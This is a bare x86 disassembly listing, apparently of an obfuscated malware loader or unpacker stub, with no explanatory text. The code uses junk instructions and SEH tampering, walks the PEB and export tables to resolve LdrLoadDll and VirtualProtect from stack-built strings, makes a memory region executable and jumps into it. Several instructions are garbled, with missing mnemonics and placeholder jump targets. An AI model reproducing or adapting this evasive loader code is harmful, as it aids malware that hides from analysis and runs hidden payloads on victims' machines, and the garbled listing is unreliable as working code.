_start
pushad
call $+5
mov [ esp ] eax
xor eax [ esp ]
sub esp 0xfffffffc
push esp
inc eax
mov edi [ esp ]
add esp 0x4
test ecx ecx
adc eax 0x1
sub edi 0x4
sub eax 0xffffffff
neg eax
call $+5
sub [ edi ] eax
retn
sub_2e702038
push edi
xor edi [ esp ]
sub esp 0xfffffffc
xor ecx ecx
or ecx edi
sub cx 0x1
dec cl
mov ch cl
sub ebp ebp
add ebp edi
call $+5
xor eax eax
add eax [ esp ]
and eax eax
adc ebp 0x1
movzx edx [ eax + ebp - 0x2 ]
call $+5
mov [ esp ] ecx
sub ecx edx
pop ecx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
sub edi edi
add edi ebp
sub_2e7020ba
push [ fs : 0x0 ]
add esi edi
mov ebx 0xffff
not edx
add esi edi
mov [ fs : 0x0 ] esp
and esi edx
and ecx ecx
adc esi edi
or edi edi
jae r-xdata
call $+5
call sub_2e7020ba
push edx
and edx 0x0
or edx [ esp + 0x10 ]
or edx edx
sbb [ edx + 0xb8 ] 0xffffffff
inc [ edx + 0xb8 ]
add esp 0x4
mov edx [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] eax
xor eax [ esp ]
add esp 0x4
retn 0x10
mov eax [ esp ]
add esp 0x4
sub eax eax
add eax [ esp ]
mov [ fs : 0x0 ] eax
and ecx ecx
adc esp 0x8
mov edi esi
mov eax [ esi + 0x3c ]
test edx edx
adc esi eax
sub eax eax
add eax 0x4550
mov ecx 0x0
or ecx [ esi ]
call $+5
mov [ esp ] eax
xor eax ecx
pop eax
jne r-xdata
jmp [ esp ]
popad
xor eax eax
add eax 0x1
retn 0xc
xor eax eax
or eax [ esi + 0x78 ]
xor esi esi
xor esi eax
add esi edi
add esp 0xfffffffc
mov [ esp ] esi
xor eax eax
xor eax [ esi + 0x20 ]
xor esi esi
or esi eax
add esi edi
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] esi
pop esi
mov ebx [ esp ]
add esp 0x4
xor edx edx
and eax 0x0
add eax esi
xor ecx ecx
or ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
mov ebp 0x0
add ebp esp
or edi edi
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
mov edi esp
xor ecx ecx
or ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub esi edi
xor eax eax
mov eax [ esi ]
xor ecx ecx
or ecx 0x5a4d
and eax ebx
sub esp 0x4
mov [ esp ] eax
sub eax ecx
pop eax
je r-xdata
mov esp 0x0
or esp ebp
mov esi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] edx
add esp 0x4
mov edx [ esp - 0x4 ]
pop edi
pop esi
xor ebx ebx
or ebx esi
sub eax eax
add eax [ esi + 0x24 ]
mov esi eax
test ecx ecx
adc esi edi
and ecx ecx
mov eax 0x0
adc eax [ esi + edx * 2 ]
and eax 0xffff
mov edx 0x0
or edx eax
xor eax eax
or eax [ ebx + 0x10 ]
sub edx eax
test edx edx
sbb edx 0xffffffff
sub esi esi
add esi [ ebx + 0x1c ]
add esi edi
mov eax 0x0
add eax [ esi + edx * 4 ]
add edi eax
and ebp 0x0
add ebp esp
push eax
xor eax [ esp ]
add esp 0x4
call $+5
mov [ esp ] eax
mov esi 0x0
add esi esp
call $+5
mov [ esp ] eax
call $+5
mov [ esp ] 0x6c006c
call $+5
mov [ esp ] 0x64002e
push 0x320033
call $+5
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
call $+5
mov [ esp ] 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
mov ecx 0x0
sub ecx esp
neg ecx
call $+5
mov [ esp ] esi
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] eax
push eax
push edi
push esi
pop esi
pop ebx
call ebx
mov eax [ esi ]
sub esp 0x4
mov [ esp ] eax
pop eax
xor ecx ecx
xor ecx [ fs : 0x30 ]
xor edi edi
add edi [ ecx + 0x10 ]
mov [ edi + 0x18 ] eax
mov esp 0x0
or esp ebp
mov ecx 0x0
sub ecx [ fs : 0x30 ]
neg ecx
mov edi 0x0
sub edi [ ecx + 0x10 ]
neg edi
mov esi 0x0
xor esi [ edi + 0x18 ]
xor edi edi
or edi esi
and eax 0x0
add eax [ esi + 0x3c ]
add esi eax
mov eax 0x0
add eax [ esi + 0x78 ]
mov esi eax
or ebx ebx
adc esi edi
sub esp 0x4
mov [ esp ] esi
mov eax 0x0
xor eax [ esi + 0x20 ]
xor esi esi
xor esi eax
test ecx ecx
adc esi edi
add esp 0xfffffffc
mov [ esp ] edi
push esi
mov esi [ esp ]
add esp 0x4
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
or eax eax
sbb esp 0xfffffffc
and eax 0x0
add eax esi
sub ecx ecx
add ecx [ esi ]
mov esi 0x0
sub esi ecx
neg esi
call $+5
mov ebp esp
or esi esi
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
push esp
pop edi
xor ecx ecx
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
or edi edi
adc edx 0x1
add eax 0x4
mov esi 0x0
add esi [ eax ]
mov esp ebp
jmp [ esp ]
mov esp 0x0
or esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
pop edx
mov edi [ esp ]
add esp 0x4
pop esi
mov ebx 0x0
or ebx esi
mov eax [ esi + 0x24 ]
sub esi esi
add esi eax
and esi esi
adc esi edi
mov eax 0x0
add eax [ esi + edx * 2 ]
and eax 0xffff
mov edx 0x0
or edx eax
mov eax 0x0
xor eax [ ebx + 0x10 ]
test eax eax
sbb edx eax
and esi esi
sbb edx 0xffffffff
mov esi 0x0
sub esi [ ebx + 0x1c ]
neg esi
or edi edi
adc esi edi
mov eax 0x0
xor eax [ esi + edx * 4 ]
and ecx ecx
adc edi eax
mov ebx 0x0
add ebx 0x1000
call $+5
pop esi
and esi 0xfffff000
add esi ebx
add esi ebx
add esp 0xfffffffc
mov [ esp ] esi
mov ecx 0x4
call $+5
add esi ebx
and eax 0x0
add eax [ esi ]
dec ecx
je r-xdata
inc edx
add eax 0x4
sub esi esi
add esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
mov eax [ esp ]
add esp 0x4
mov esi [ esp ]
add esp 0x4
push eax
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
add esp 0xfffffffc
mov [ esp ] 0x45ba
sub esp 0x4
mov [ esp ] esi
push edi
push esi
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
or edx edx
adc eax 0x18
push eax
sub esp 0x4
mov [ esp ] ebp
xor ebp ebp
or ebp esp
or esi esi
adc ebx 0x5
jmp ebx
jmp [ esp ]
